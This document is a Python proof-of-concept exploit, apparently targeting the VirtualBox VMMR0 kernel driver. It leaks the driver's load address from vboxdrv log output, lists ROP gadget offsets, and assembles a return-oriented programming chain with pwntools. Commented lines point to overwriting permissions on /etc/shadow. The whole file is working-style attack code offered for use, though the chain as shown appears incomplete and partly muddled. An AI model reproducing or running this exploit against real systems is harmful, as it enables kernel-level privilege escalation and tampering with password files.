#!/usr/bin/python3
import sys
from pwn import *
context.clear(arch='amd64', kernel='amd64')
'''
gcc userspace.c -o userspace
python3 ./poc.py VMMR0.r0

VMMR0:  http://www.ropshell.com/ropsearch?h=f81f7bdd9ffe47e093805c9d2f626f38
pop rdi; ret;                       VMMR0 + 0x7b62a
pop rax; ret;                       VMMR0 + 0x1f7bd
mov rax, [rdi + 0x2a50]; ret;       VMMR0 + 0x0b7470
syscall; ret;                       VMMR0 + 0x012c3c0
push rsp; ret;                      VMMR0 + 0x1f7ad
pop rbp; ret;                       VMMR0 + 0x28d
xor eax,eax; ret;                   VMMR0 + 0x8b8
'''

def leaked(leaker_start, search_for):
    # Get the address from the leak
    leaker = process(leaker_start + [search_for])
    leak = [l for l in leaker.recv().decode('utf-8').replace('\r', '').split('\n') if 'vboxdrv:' in l and search_for in l]
    if len(leak) < 1:
        return
    leak = leak[-1].split()
    if len(leak) < 3:
        return
    leak = int(leak[-2], 16)
    return leak, leaker

def build(leak, gadget_file):
    # Load the target binary
    with open(gadget_file, 'rb') as i:
        binary = ELF.from_bytes(i.read(), vma=leak)
    # Create the ROP stack
    rop = ROP(binary)
    # Build a string in the .bss section of the target driver
    # the .bss section starts at the address the driver was loaded
    # We have to adjust because the gadget we have is rdi + 0x2a50
    # rop.raw(b'/etc/sha')
    # rop.raw(b'dow\x00')
    # rop.raw(0666)

    # mov rax, [rdi + 0x2a50]; ret;
    rop.raw(leak + 0x0b7470)
    # /
    rop.raw(b'/')
    # pop rax; ret;
    rop.raw(leak + 0x01f7bd)
    # rdi - addition to rdi
    rop.raw(leak - 0x2a50)
    # pop rdi; ret;
    rop.raw(leak + 0x07b62a)

    print(rop.dump())
    return bytes(rop)

def main():
    leak, leaker = leaked(['./userspace'], sys.argv[1])
    print('Leaked address is', str(hex(leak)))
    exploit = build(leak, sys.argv[1])
    print(enhex(exploit))
    leaker.shutdown()

if __name__ == '__main__':
    main()
